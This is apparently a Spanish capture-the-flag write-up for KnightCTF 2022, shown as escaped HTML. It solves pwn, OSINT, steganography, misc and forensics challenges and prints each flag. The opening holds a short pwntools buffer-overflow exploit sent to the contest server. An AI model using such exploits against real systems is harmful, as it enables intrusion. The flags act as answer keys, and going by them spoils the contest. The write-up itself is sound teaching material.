-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;terminal&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;gnome-terminal&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;-x&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;arch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;198.211.115.81&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x4011d3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;junk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{bAbY_bUfF3r_0v3Rf1Ow}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;osint&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;OSINT&lt;/h3&gt;
-
-&lt;h4 id=&quot;canada-server&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Canada Server&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/10.png&quot; alt=&quot;10&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Este reto es bastante simple, solamente teníamos que hacer una pequeña búsqueda en internet.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/11.png&quot; alt=&quot;11&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{192.99.167.83}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;find-the-camera&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Find The Camera&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/12.png&quot; alt=&quot;12&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez descargamos el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/Bus.png&quot;&gt;archivo adjunto&lt;/a&gt;, vamos a darnos cuenta que los derechos de autor le pertenecen a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JenCh012&lt;/code&gt;, así que procedemos a buscarlo.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/13.png&quot; alt=&quot;13&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que, aparte de algunas páginas rusas, nuestra búsqueda guarda relación con autobuses, por lo que estamos en el lugar correcto, entraremos en el primer resultado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/14.png&quot; alt=&quot;14&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos observar que hay una sección en la que podemos introducir la matrícula del autobús, y posteriormente, nos arrojará un resultado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/15.png&quot; alt=&quot;15&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ambas fotografías curiosamente pertenecen al usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JenCh012&lt;/code&gt;, por lo que haremos clic en la fotografía que nos interesa.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/16.png&quot; alt=&quot;16&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ya con esto habríamos conseguido el modelo de la cámara, ahora solamente haría falta saber a que marca pertenece.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{SONY_DSC_S&amp;amp;980}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;steganography&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Steganography&lt;/h3&gt;
-
-&lt;h4 id=&quot;follow-the-white-rabbit&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Follow The White Rabbit&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/17.png&quot; alt=&quot;17&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez descargado el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/whiterabbit.jpg&quot;&gt;archivo adjunto&lt;/a&gt;, podemos darnos cuenta que existe una serie de puntos y líneas, por lo que podemos intuir que estamos frente a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;código morse&lt;/code&gt;. Para decodificarlo, podemos usar herramientas como &lt;a href=&quot;https://www.dcode.fr/codigo-morse&quot;&gt;dcode&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{L0OKB4Y0UL34P}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;follow&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Follow&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/18.png&quot; alt=&quot;18&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Cuando empezamos a analizar el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/Follow.pdf&quot;&gt;archivo PDF&lt;/a&gt; adjunto, rápidamente nos daremos cuenta que existe un espacio en blanco demasiado grande. Por lo que si marcamos el espacio en blanco, nos daremos cuenta que hay algo ahí.&lt;/p&gt;
-
-&lt;div style=&quot;text-align:center&quot;&gt;
-  &lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/19.png&quot; alt=&quot;19&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;
-&lt;/div&gt;
-
-&lt;p&gt;De modo que copiaremos y pegaremos el texto en otro lado, revelando así la flag.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{This_is_the_real_flag}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;qr-code-from-the-future&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;QR Code From The Future&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/20.png&quot; alt=&quot;20&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al abrir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/QR_Code_From_The_Future.gif&quot;&gt;archivo adjunto&lt;/a&gt;, nos daremos cuenta que estamos frente a una sucesión de códigos QR que cambia bastante rápido, por lo que, lo primero que haremos será identificar cada uno de los &lt;em&gt;frames&lt;/em&gt; que componen este &lt;em&gt;GIF&lt;/em&gt;, para ello podemos hacer uso de &lt;a href=&quot;https://ezgif.com/split&quot;&gt;Ezgif&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;Una vez hemos conseguido los &lt;em&gt;48 códigos QR&lt;/em&gt; que componen el &lt;em&gt;GIF&lt;/em&gt;, pasaremos a decodificar cada uno de ellos; para agilizar el proceso haremos uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zbarimg&lt;/code&gt;, por lo que deberemos de tener descargados todos los &lt;em&gt;códigos QR&lt;/em&gt;. En caso de no contar con la herramienta descargada podemos hacer lo siguiente:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install zbar-tools
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zbarimg * | cut -d &quot;:&quot; -f2 | tr -d &quot;\n&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/21.png&quot; alt=&quot;21&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Una vez escaneados los &lt;em&gt;48 código QR&lt;/em&gt; conseguiremos la siguiente cadena de caracteres:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;}pvznalq_bg_pvgngf_zbes_qriybir_gbt_rqbp_ED{SGPX
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ligeramente podemos empezar a ver el formato de la flag, de modo que la cadena que acabamos de conseguir, está al revés.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;zbarimg * | cut -d &quot;:&quot; -f2 | tac | tr -d &quot;\n&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/22.png&quot; alt=&quot;22&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;La cadena, está encriptada por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ROT13&lt;/code&gt;, por lo que al &lt;a href=&quot;https://rot13.com/&quot;&gt;decodificarla&lt;/a&gt;, conseguiremos la flag:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{QR_code_got_evolved_from_static_to_dynamic}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;misc&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Misc&lt;/h3&gt;
-
-&lt;h4 id=&quot;unzip-me&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Unzip Me&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/23.png&quot; alt=&quot;23&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al descomprimir el archivo &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/unzipme.tar.gz&quot;&gt;unzipme.tar.gz&lt;/a&gt;, extraeremos un archivo que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzipme&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;El propio nombre del archivo nos sugiere que debemos de descomprimirlo, sin embargo, no conocemos en que formato está comprimido; podríamos hacer uso del comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, pero nos dirá que simplemente se trata de &lt;em&gt;data&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;Como no conocemos el formato del archivo, podríamos visualizar su contenido en &lt;em&gt;hexadecimal&lt;/em&gt; haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt;, para así conseguir su &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xxd unzipme
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/24.png&quot; alt=&quot;24&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nos percatamos, cada pareja de dígitos está dada la vuelta; es decir, la forma correcta de los cuatro primeros dígitos debería ser &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;504B 0304&lt;/code&gt;, esto corresponde con el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt; de los archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PKZip&lt;/code&gt;. Tenemos una lista completa de &lt;em&gt;magic numbers&lt;/em&gt;, de varios tipos de archivos, &lt;a href=&quot;https://asecuritysite.com/forensics/magic&quot;&gt;aquí&lt;/a&gt;.&lt;/p&gt;
-
-&lt;p&gt;De este modo, haciendo uso de &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt;, podemos descomprimir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzipme&lt;/code&gt;. Lo primero que haremos será indicar que queremos trabajar con el formato &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hexdump&lt;/code&gt;, y posterior a ello introduciremos el output conseguido con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/25.png&quot; alt=&quot;25&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Luego de esto, indicaremos que queremos cambiar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;endianness&lt;/code&gt; cada &lt;em&gt;2 bytes&lt;/em&gt;, para finalmente descomprimir el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unzipme&lt;/code&gt; y conseguir la flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/26.png&quot; alt=&quot;26&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{sO_yOu_sWaPP3D_tHe_f1L3}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;look-closely&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Look Closely&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/27.png&quot; alt=&quot;27&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para este reto se nos da un archivo &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/look%20closely.wav&quot;&gt;.wav&lt;/a&gt;, del cual no logramos identificar nada. Lo que podemos hacer es visualizar el espectrograma con herramientas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Audacity&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo apt install audacity
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/28.png&quot; alt=&quot;28&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://drive.google.com/file/d/1_6c_waS9ijouTpqI_tUO6VCRf7fE6gCY/view?usp=sharing
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En el enlace encontraremos un video que aparte de verse fatal, contiene dos cadenas de caracteres escritas en binario.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/29.png&quot; alt=&quot;29&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01001011 01000011 01010100 01000110 01111011 01001000 00110011
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/30.png&quot; alt=&quot;30&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;01001100 01001100 01001111 01011111 01001010 00110011 01001100 01001100 01001111 01111101 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez las unimos, y &lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Binary(&apos;Space&apos;,8)&quot;&gt;traducimos&lt;/a&gt; obtenemos la flag.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{H3LLO_J3LLO}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;digital-forensics&quot;&gt;&lt;a href=&quot;#header-3&quot;&gt;&lt;/a&gt;Digital Forensics&lt;/h3&gt;
-
-&lt;h4 id=&quot;the-lost-flag&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;The Lost Flag&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/31.png&quot; alt=&quot;31&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A la hora de abrir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/Lost%20Flag%20.png&quot;&gt;archivo adjunto&lt;/a&gt; no vamos a encontrar nada sospechoso a primera vista.&lt;/p&gt;
-
-&lt;p&gt;No obstante, si utilizamos herramientas como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StegSolve&lt;/code&gt; o &lt;a href=&quot;https://29a.ch/photo-forensics/&quot;&gt;Forensically&lt;/a&gt;, vamos a poder visualizar la flag.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://www.caesum.com/handbook/Stegsolve.jar -O stegsolve.jar
-chmod +x stegsolve.jar
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/32.png&quot; alt=&quot;32&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;KCTF{Y0U_F0UND_M3}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;unknown-file&quot;&gt;&lt;a href=&quot;#header-4&quot;&gt;&lt;/a&gt;Unknown File&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/33.png&quot; alt=&quot;33&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Al descomprimir el &lt;a href=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/unknown file.zip&quot;&gt;archivo adjunto&lt;/a&gt;, extraeremos un archivo que lleva por nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unknown file&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Así como el enunciado sugiere, no se sabe ante que tipo de archivo nos estamos enfrentando, por lo que comandos como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, no nos serán de utilidad. Lo que podemos hacer es visualizar el contenido del archivo en &lt;em&gt;hexadecimal&lt;/em&gt; haciendo uso de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xxd&lt;/code&gt;, para así conseguir su &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;xxd unknown\ file | head
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2022-01-17-KnightCTF-2022/34.png&quot; alt=&quot;34&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si nos percatamos, el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic number&lt;/code&gt; no corresponde con &lt;a href=&quot;https://asecuritysite.com/forensics/magic&quot;&gt;ninguno conocido&lt;/a&gt;, sin embargo, podemos observar una sección que dice &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IHDR&lt;/code&gt;, el cual corresponde con uno de los &lt;em&gt;chunks&lt;/em&gt; principales de cualquier imagen &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PNG&lt;/code&gt;.&lt;/p&gt;
-
